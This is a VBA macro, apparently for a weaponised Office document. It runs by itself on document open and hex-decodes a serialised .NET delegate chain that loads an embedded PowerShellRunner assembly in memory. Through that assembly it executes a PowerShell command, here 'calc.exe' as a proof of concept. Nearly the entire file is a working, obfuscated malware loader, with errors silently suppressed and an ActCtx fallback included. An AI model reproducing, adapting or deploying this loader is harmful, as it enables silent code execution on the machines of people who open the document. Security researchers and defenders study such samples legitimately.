Sub document_open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub

Sub DebugPrint(s)
    Debug.Print s
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function Run()
    On Error Resume Next

    Dim s As String
    s = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
    s = s & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C64657209020000000903000000090400000004020000003053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727907000000047479706508"
    s = s & "617373656D626C79067461726765741274617267657454797065417373656D626C790E746172676574547970654E616D650A6D6574686F644E616D650D64656C6567617465456E747279010102010101033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E74727906050000002F53797374656D2E52756E74696D65"
    s = s & "2E52656D6F74696E672E4D6573736167696E672E48656164657248616E646C657206060000004B6D73636F726C69622C2056657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530383906070000000774617267657430090600000006090000000F53797374656D2E44656C6567"
    s = s & "617465060A0000000D44796E616D6963496E766F6B650A04030000002253797374656D2E44656C656761746553657269616C697A6174696F6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300307033053797374656D2E44656C656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E747279022F53797374"
    s = s & "656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C646572090B000000090C000000090D00000004040000002F53797374656D2E5265666C656374696F6E2E4D656D626572496E666F53657269616C697A6174696F6E486F6C64657206000000044E616D650C417373656D626C794E616D6509436C6173734E616D65095369676E6174"
    s = s & "7572650A4D656D626572547970651047656E65726963417267756D656E7473010101010003080D53797374656D2E547970655B5D090A0000000906000000090900000006110000002C53797374656D2E4F626A6563742044796E616D6963496E766F6B652853797374656D2E4F626A6563745B5D29080000000A010B0000000200000006120000002053797374656D2E586D6C2E5363"
    s = s & "68656D612E586D6C56616C756547657474657206130000004D53797374656D2E586D6C2C2056657273696F6E3D322E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D6237376135633536313933346530383906140000000774617267657430090600000006160000001A53797374656D2E5265666C656374696F6E2E417373656D62"
    s = s & "6C790617000000044C6F61640A0F0C00000000360000024D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000"
    s = s & "00504500004C01030064C578620000000000000000E00022200B013000002E00000006000000000000224C000000200000006000000000001000200000000200000400000000000000040000000000000000A000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000D04B00004F00000000600000B80300000000000000"
    s = s & "0000000000000000000000008000000C000000984A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000282C000000200000002E000000020000000000000000000000000000200000602E72737263000000B80300"
    s = s & "00006000000004000000300000000000000000000000000000400000402E72656C6F6300000C0000000080000000020000003400000000000000000000000000004000004200000000000000000000000000000000044C00000000000048000000020005009C240000FC2500000100000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "0000000000000000000000000000001E02280E00000A2A1E0328030000062A1B3003008500000001000011730F0000060A280F00000A0B07146F1000000A0607281100000A0C086F1200000A086F1300000A0D096F1400000A026F1500000A096F1400000A166F1600000A18176F1700000A096F1400000A72010000706F1800000A096F1900000A26DE14092C06096F1A00000ADC08"
    s = s & "2C06086F1A00000ADC066F1B00000A74040000026F1B0000062A000000011C0000020028003860000A0000000002001B004F6A000A000000001E027B010000042A1A72190000702A221716731C00000A2A1E027B020000042A2E281D00000A6F1E00000A2A2E281D00000A6F1F00000A2A2E7231000070732000000A7A2E72AA010070732000000A7A062A7602282100000A7D010000"
    s = s & "040273100000067D0200000402282200000A2A7602733C0000067D0400000402282300000A02732400000A7D030000042A3A027B03000004056F2500000A262A4A027B0300000472210300706F2500000A262A62027B03000004057221030070282600000A6F2500000A262A3A027B03000004036F2500000A262A62027B03000004722503007003282600000A6F2700000A262A6202"
    s = s & "7B03000004723503007003282600000A6F2700000A262A3A027B03000004036F2700000A262A62027B03000004724503007003282600000A6F2700000A262A62027B03000004725903007003282600000A6F2700000A262A32027B030000046F2800000A2A2E726D030070732000000A7A2E72D0040070732000000A7A2E7245060070732000000A7A2E72C4070070732000000A7A1E"
    s = s & "027B040000042A2E7243090070732000000A7A2E72AA0A0070732000000A7A1E027B090000042A2202037D090000042A1E027B0C0000042A2202037D0C0000042A1E027B060000042A2202037D060000042A1E027B070000042A2202037D070000042A2E722D0C0070732000000A7A1E027B080000042A2202037D080000042A2E72770C0070732000000A7A2E72C30C007073200000"
    s = s & "0A7A1E027B0A0000042A1E027B0B0000042A2E72050D0070732000000A7A2E726A0E0070732000000A7A2E72BA0E0070732000000A7A2E72060F0070732000000A7A1E027B0D0000042A2202037D0D0000042A1E027B050000042A2202037D050000042A1E027B0E0000042A2202037D0E0000042A13300300EC00000002000011021200FE152500000112001F78282900000A12001F"
    s = s & "64282A00000A067D05000004021201FE1526000001120116282B00000A120116282C00000A077D0600000402177D07000004021F0F7D08000004021200FE1525000001120020FFFFFF7F282900000A120020FFFFFF7F282A00000A067D0A000004021200FE152500000112001F64282900000A12001F64282A00000A067D0B000004021200FE152500000112001F64282900000A1200"
    s = s & "20E8030000282A00000A067D0C000004021201FE1526000001120116282B00000A120116282C00000A077D0D0000040272500F00707D0E00000402282D00000A2A42534A4201000100000000000C00000076322E302E35303732370000000005006C00000084090000237E0000F0090000240A000023537472696E67730000000014140000540F000023555300682300001000000023"
    s = s & "47554944000000782300008402000023426C6F6200000000000000020000015715A2090902000000FA0133001600000100000033000000050000000E0000003C000000340000002D0000000E0000000200000003000000130000001B000000010000000100000002000000030000000000520501000000000006006B0340080600D80340080600B802D2070F00600800000600E00209"
    s = s & "0606004E03090606002F0309060600BF03090606008B0309060600A40309060600F70209060600CC0221080600AA02210806001203090606005A0980050A009002F2070A003201F2070A005702F2070A00DD09B5090600AB0080050600970580050A00E300B5090600DC06F40506000407EF090600BF0780050A00C700CB0506000E0057000A005809CB050600010033050A00B906B5"
    s = s & "090A00CA06B5090A001205CB050A006F08CB050A00B808CB050A001501B5090600E704130A0A00C704B5090A00AC08B5090A006705B5090A009501B5090A00E806B5090A00CE08B5090A002707CB050A00030AF2070A001B06F2070A00B000F2070A009808F20706008901800506009D00CC040600A10680050600F6048005000000001B000000000001000100010010003C073C073D"
    s = s & "000100010003001000D70900004D000100040003001000DD00000059000300100003001000F70000008D000500230001008A00AC0001000E05B00001005300B40001000705B8000100C004BC0001005306C10001004404C60001007507C9000100AE07C90001008804BC000100B104BC0001001A04BC0001008906C1000100C901CD005020000000008618CC07060001005820000000"
    s = s & "008600F506D000010060200000000096003500D5000200102100000000C6087200DA000300182100000000C608D6018D0003001F2100000000C6089305DF000300282100000000C608240066000300302100000000C6087502770003003C2100000000C608600277000300482100000000C600920906000300542100000000C600A40906000300602100000000C600B4050600030060"
    s = s & "2100000000C6009F0506000300602100000000C6006C09010003006221000000008618CC07060004008021000000008618CC07060004009E2100000000C600A402E4000400AD2100000000C600180206000700C02100000000C6001802E4000700D92100000000C600A40210000A00E82100000000C600330210000B00012200000000C600420210000C001A2200000000C600180210"
    s = s & "000D00292200000000C600070210000E00422200000000C600220210000F00602100000000C600F208ED0010005B22000000008608E4098D001200682200000000C600AE09F4001200742200000000C6003B0106011500802200000000C6001F05130119008C2200000000C6001F0523011F00982200000000C6082B002D012300A02200000000C600F3018D002300AC2200000000C6"
    s = s & "00DD0433012300B82200000000C608860739012300C02200000000C6089A073E012300C92200000000C608FC0344012400D12200000000C6080B044A012400DA2200000000C6082D0651012500E22200000000C608400657012500EB2200000000C60826045E012600F32200000000C608350401002600FC2200000000C600120706002700082300000000C6084D0739012700102300"
    s = s & "000000C60861073E012700192300000000C600240962012800252300000000C608780171012900312300000000C6086E0444012900392300000000C6089F0444012900412300000000C600FB09750129004D2300000000C6000F097E012A00592300000000C60036098E012E00652300000000C600360998013000712300000000C608630651013200792300000000C6087606570132"
    s = s & "00822300000000C6085004440133008A2300000000C6085F044A013300932300000000C608A9018D0034009B2300000000C608B90110003400A423000000008618CC070600350000000100B80000000100B80000000100600100000100760700000200AF0700000300F60300000100760700000200AF0700000300F60300000100F60300000100690100000100F60300000100F60300"
    s = s & "000100690100000100690100000100810000000200D60000000100990600000200690100000300DD08000001009906000002006901000003001908000004004B0100000100990600000200690100000300DF0100000400E80100000500810800000600EA0800000100990600000200690100000300DF0100000400E80100000100F60300000100F60300000100F60300000100F60300"
    s = s & "000100F603000001009F0100000100EA0800000100590100000200E80500000300F006000004007205000001009F01000002007205000001008C0500000200480900000100F60300000100F60300000100F6030900CC0701001100CC0706001900CC070A002900CC0710003100CC0710003900CC0710004100CC0710004900CC0710005100CC0710005900CC0710006100CC07150069"
    s = s & "00CC0710007100CC0710007900CC07060081007A092500810023072A0061012C013100890087050600890051023A009100E5073F006901880910000C0077054D007101000953006901A4001000910071015D00810188020600990024006600A900CC076B008901920071008901750277008901600277009101CC071000A100A8007C009900CC070600B100CC070600C100CC070600C1"
    s = s & "00C0008100990151098700C100FC0181007900F4048D002901FD04010029016109010031013E0001003101440001001901CC0706002E000B00DF012E001300E8012E001B0007022E00230010022E002B0026022E00330026022E003B0026022E00430010022E004B002C022E00530026022E005B0026022E00630044022E006B006E0243005B007B021A009100030001000400070005"
    s = s & "00090000007600A8010000EE01AD0100009705B10100003200B60100007902BB0100006402BB010000E809AD0100002F00C00100009E07C60100000F04CB0100004406D10100003904D70100006507C60100007C01DB0100007204CB010000A304CB0100007A06D1010000B504CB010000BD01AD01020004000300020005000500020006000700020007000900020008000B00020009"
    s = s & "000D0002001B000F0002002000110002002300130001002400130002002500150001002600150002002700170001002800170002002900190001002A00190002002C001B0001002D001B0002002F001D00020030001F0002003100210002003600230001003700230002003800250001003900250002003A00270001003B00270045000480000001000000000000000000000000003C"
    s = s & "0700000200000000000000000000009A004A0000000000010000000000000000000000A300CB05000000000300020004000200050002000000000000436F6C6C656374696F6E60310044696374696F6E6172796032003C4D6F64756C653E006765745F5549006765745F526177554900496E766F6B655053007365745F58007365745F59006D73636F726C6962005F73620053797374"
    s = s & "656D2E436F6C6C656374696F6E732E47656E65726963006765745F496E7374616E6365496400736F757263654964005F686F73744964006765745F43757272656E7454687265616400416464004E65774775696400436F6D6D616E6400636F6D6D616E6400417070656E640050726F67726573735265636F7264007265636F726400437573746F6D5053486F737455736572496E7465"
    s = s & "726661636500437573746F6D505352486F737452617755736572496E74657266616365005053486F737452617755736572496E746572666163650043726561746552756E73706163650050726F6D7074466F7243686F6963650064656661756C7443686F69636500736F757263650065786974436F6465006D65737361676500496E766F6B65006765745F4B6579417661696C61626C"
    s = s & "650049446973706F7361626C650052656374616E676C650072656374616E676C65006765745F57696E646F775469746C65007365745F57696E646F775469746C65005F77696E646F775469746C65006765745F4E616D6500757365724E616D65007461726765744E616D6500526561644C696E6500417070656E644C696E65005772697465566572626F73654C696E65005772697465"
    s = s & "4C696E650057726974655761726E696E674C696E6500577269746544656275674C696E650057726974654572726F724C696E6500437265617465506970656C696E65006765745F43757272656E74554943756C74757265006765745F43757272656E7443756C7475726500446973706F736500496E697469616C53657373696F6E537461746500577269746500477569644174747269"
    s = s & "627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E4174747269"
    s = s & "6275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65"
    s = s & "436F6D7061746962696C6974794174747269627574650076616C7565006765745F42756666657253697A65007365745F42756666657253697A65005F62756666657253697A65006765745F437572736F7253697A65007365745F437572736F7253697A65005F637572736F7253697A65006765745F57696E646F7753697A65007365745F57696E646F7753697A65006765745F4D6178"
    s = s & "506879736963616C57696E646F7753697A65005F6D6178506879736963616C57696E646F7753697A65006765745F4D617857696E646F7753697A65005F6D617857696E646F7753697A65005F77696E646F7753697A650053797374656D2E546872656164696E6700526561644C696E654173536563757265537472696E6700546F537472696E67007365745F5769647468005F726177"
    s = s & "5569005F756900505343726564656E7469616C0050726F6D7074466F7243726564656E7469616C0053797374656D2E436F6C6C656374696F6E732E4F626A6563744D6F64656C00506F7765725368656C6C52756E6E65722E646C6C0042756666657243656C6C0066696C6C006765745F4974656D0053797374656D004F70656E006F726967696E006765745F56657273696F6E004E6F"
    s = s & "74696679456E644170706C69636174696F6E004E6F74696679426567696E4170706C69636174696F6E0053797374656D2E4D616E6167656D656E742E4175746F6D6174696F6E0064657374696E6174696F6E0053797374656D2E476C6F62616C697A6174696F6E0053797374656D2E5265666C656374696F6E00436F6D6D616E64436F6C6C656374696F6E006765745F437572736F72"
    s = s & "506F736974696F6E007365745F437572736F72506F736974696F6E005F637572736F72506F736974696F6E006765745F57696E646F77506F736974696F6E007365745F57696E646F77506F736974696F6E005F77696E646F77506F736974696F6E0063617074696F6E004E6F74496D706C656D656E746564457863657074696F6E004669656C644465736372697074696F6E0043686F"
    s = s & "6963654465736372697074696F6E0043756C74757265496E666F004B6579496E666F00636C697000496E766F6B6550534D656D62657200537472696E674275696C64657200466C757368496E707574427566666572007365745F417574686F72697A6174696F6E4D616E6167657200506F7765725368656C6C52756E6E6572006765745F466F726567726F756E64436F6C6F72007365"
    s = s & "745F466F726567726F756E64436F6C6F72005F666F726567726F756E64436F6C6F72006765745F4261636B67726F756E64436F6C6F72007365745F4261636B67726F756E64436F6C6F72005F6261636B67726F756E64436F6C6F7200436F6E736F6C65436F6C6F72002E63746F720053797374656D2E446961676E6F7374696373006765745F436F6D6D616E64730053797374656D2E"
    s = s & "4D616E6167656D656E742E4175746F6D6174696F6E2E52756E7370616365730063686F696365730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F64657300505343726564656E7469616C547970657300616C6C6F77656443726564656E74"
    s = s & "69616C547970657300506970656C696E65526573756C74547970657300436F6F7264696E6174657300505343726564656E7469616C55494F7074696F6E7300526561644B65794F7074696F6E73006465736372697074696F6E73006F7074696F6E7300577269746550726F6772657373004D657267654D79526573756C7473005363726F6C6C427566666572436F6E74656E74730047"
    s = s & "6574427566666572436F6E74656E747300536574427566666572436F6E74656E747300636F6E74656E747300436F6E6361740050534F626A656374007365745F4865696768740053657453686F756C64457869740043726561746544656661756C740041646453637269707400456E7465724E657374656450726F6D707400457869744E657374656450726F6D70740053797374656D"
    s = s & "2E4D616E6167656D656E742E4175746F6D6174696F6E2E486F737400437573746F6D5053486F7374006765745F4F75747075740053797374656D2E5465787400526561644B65790052756E7370616365466163746F72790053797374656D2E5365637572697479000000176F00750074002D00640065006600610075006C007400011743006F006E0073006F006C00650048006F0073"
    s = s & "00740000817745006E007400650072004E0065007300740065006400500072006F006D007000740020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C0020007700"
    s = s & "6800690063006800200069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E00200065007800650063007500"
    s = s & "74006500200077006900740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E0001817545007800690074004E0065007300740065006400500072006F006D007000740020006900730020006E006F007400200069006D0070006C0065006D0065006E00740065"
    s = s & "0064002E002000200054006800650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C00200077006800690063006800200069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E"
    s = s & "0073006F006C0065002E00200020004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E0020006500780065006300750074006500200077006900740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E00700075"
    s = s & "0074002E0001030A00000F440045004200550047003A002000000F4500520052004F0052003A002000001356004500520042004F00530045003A00200000135700410052004E0049004E0047003A002000008161500072006F006D007000740020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800650020007300"
    s = s & "630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C00200077006800690063006800200069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D006100"
    s = s & "6B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E0020006500780065006300750074006500200077006900740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E00018173500072006F006D00700074"
    s = s & "0046006F007200430068006F0069006300650020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C0020007700680069006300680020006900730020006100200070"
    s = s & "0072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E0020006500780065006300750074006500200077006900740068006F007500740020"
    s = s & "00700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E0001817D500072006F006D007000740046006F007200430072006500640065006E007400690061006C00310020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800"
    s = s & "650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C00200077006800690063006800200069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E002000"
    s = s & "20004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E0020006500780065006300750074006500200077006900740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E0001817D500072006F"
    s = s & "006D007000740046006F007200430072006500640065006E007400690061006C00320020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C00200077006800690063"
    s = s & "006800200069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E002000650078006500630075007400650020"
    s = s & "0077006900740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E0001816552006500610064004C0069006E00650020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E0020002000540068006500200073006300"
    s = s & "72006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C00200077006800690063006800200069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D0061006B00"
    s = s & "650020007300750072006500200074006800650020007300630072006900700074002000630061006E0020006500780065006300750074006500200077006900740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E0001818152006500610064004C0069006E"
    s = s & "0065004100730053006500630075007200650053007400720069006E00670020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C0020007700680069006300680020"
    s = s & "0069007300200061002000700072006F0062006C0065006D002000730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E00200065007800650063007500740065002000770069"
    s = s & "00740068006F00750074002000700072006F006D007000740069006E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E00014946006C0075007300680049006E0070007500740042007500660066006500720020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E00004B470065"
    s = s & "00740042007500660066006500720043006F006E00740065006E007400730020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E0000414B006500790041007600610069006C00610062006C00650020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E0000816352006500610064004B00"
    s = s & "6500790020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E002000200054006800650020007300630072006900700074002000690073002000610073006B0069006E006700200066006F007200200069006E007000750074002C00200077006800690063006800200069007300200061002000700072006F0062006C0065006D002000"
    s = s & "730069006E00630065002000740068006500720065002700730020006E006F00200063006F006E0073006F006C0065002E00200020004D0061006B00650020007300750072006500200074006800650020007300630072006900700074002000630061006E0020006500780065006300750074006500200077006900740068006F00750074002000700072006F006D00700074006900"
    s = s & "6E006700200074006800650020007500730065007200200066006F007200200069006E007000750074002E00014F5300630072006F006C006C0042007500660066006500720043006F006E00740065006E007400730020006900730020006E006F007400200069006D0070006C0065006D0065006E00740065006400004B53006500740042007500660066006500720043006F006E00"
    s = s & "740065006E007400730020006900730020006E006F007400200069006D0070006C0065006D0065006E007400650064002E00004953006500740042007500660066006500720043006F006E00740065006E007400730020006900730020006E006F007400200069006D0070006C0065006D0065006E00740065006400000100000031F3FAE359206E40A5ECBCADA61785940004200101"
    s = s & "0803200001052001011111042001010E04200101020A0704120C1241124512490400001241062001011280AD0800021245124D124104200012490520001280B507151275011280B9052001130008092002011180BD1180BD08200015127501127104200012590520020108080500001280C5042000125D040000115105200112610E0500020E0E0E0320000E08070211809511809908"
    s = s & "B77A5C561934E0890831BF3856AD364E3503061151030612100306126103061214040611809504061180990206080306116502060E0420010E0E0400010E0E0420001151042000125508200301116511650E062002010A126911200315126D020E12710E0E1512750112790C2004080E0E15127501127D080F20061280810E0E0E0E1180851180890920041280810E0E0E0E05200012"
    s = s & "808D05200012809104200011650520010111650520001180950620010111809505200011809906200101118099032000080E20011411809D02000200001180A1032000020820011180A51180A90F2004011180A11180991180A111809D092002011180A111809D0F2002011180991411809D020002000004280011510328000E04280012550428001259042800125D05280012808D04"
    s = s & "2800116505280011809505280011809903280008032800020801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730108010002000000000015010010506F7765725368656C6C52756E6E6572000005010000000017010012436F7079726967687420C2A920203230313400002901002464666334656562622D373338342D346462352D3962"
    s = s & "61642D32353732303330323962643900000C010007312E302E302E3000000501000100000000000000000064C5786200000000020000001C010000B44A0000B42C0000525344532CF960F611F279489DD4FCC2E977179C01000000433A5C55736572735C4C6F63616C5C4465736B746F705C546F6F6C735C556E6D616E61676564506F7765725368656C6C2D6D61737465725C506F77"
    s = s & "65725368656C6C52756E6E65725C6F626A5C52656C656173655C506F7765725368656C6C52756E6E65722E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F84B00000000000000000000124C0000002000000000000000000000000000000000000000000000044C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002000100000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "0000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000586000005C03000000000000000000005C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001"
    s = s & "000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004BC020000010053007400720069006E006700460069006C00650049006E0066006F0000009802000001"
    s = s & "003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D00650000000000000000004A0011000100460069006C0065004400650073006300720069007000740069006F006E000000000050006F007700650072005300680065006C006C00520075006E006E"
    s = s & "006500720000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000004A001500010049006E007400650072006E0061006C004E0061006D006500000050006F007700650072005300680065006C006C00520075006E006E00650072002E0064006C006C00000000004800120001004C006500670061006C0043"
    s = s & "006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003100340000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005200150001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000050006F0077006500720053"
    s = s & "00680065006C006C00520075006E006E00650072002E0064006C006C0000000000420011000100500072006F0064007500630074004E0061006D0065000000000050006F007700650072005300680065006C006C00520075006E006E006500720000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E0030"
    s = s & "00000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000C000000243C0000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    s = s & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010D00000004000000091700000009060000000916000000061A0000002753797374656D2E5265666C656374696F6E2E417373656D626C79204C6F616428427974655B5D29080000000A0B"

    entry_class = "PowerShellRunner.PowerShellRunner"

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")

    If stm Is Nothing Then
        manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""><assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" /><clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Ser"
        manifest = manifest & "ialization.Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907746-455E-39A7-BD31-BC9F81468347}"" progid=""System.Collections.ArrayList"" threadingModel=""Both"" name=""System.Co"
        manifest = manifest & "llections.ArrayList"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468347}"" progid=""System.Text.ASCIIEncoding"" threadingModel=""Both"" name=""System.Text.ASCIIEncoding"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81488347}"" progid=""System."
        manifest = manifest & "Security.Cryptography.FromBase64Transform"" threadingModel=""Both"" name=""System.Security.Cryptography.FromBase64Transform"" runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeV"
        manifest = manifest & "ersion=""v4.0.30319"" /></assembly>"

        Set ax = CreateObject("Microsoft.Windows.ActCtx")
        ax.ManifestText = manifest
        
        Set stm = ax.CreateObject("System.IO.MemoryStream")
        Set fmt = ax.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
        Set al = ax.CreateObject("System.Collections.ArrayList")
    Else
        Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
        Set al = CreateObject("System.Collections.ArrayList")
    End If

    Dim dec
    dec = decodeHex(s)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set d = fmt.Deserialize_2(stm)
    al.Add Empty

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    DebugPrint o.InvokePSMember("calc.exe")
    If Err.Number <> 0 Then
      DebugPrint Err.Description
      Err.Clear
    End If
End Function
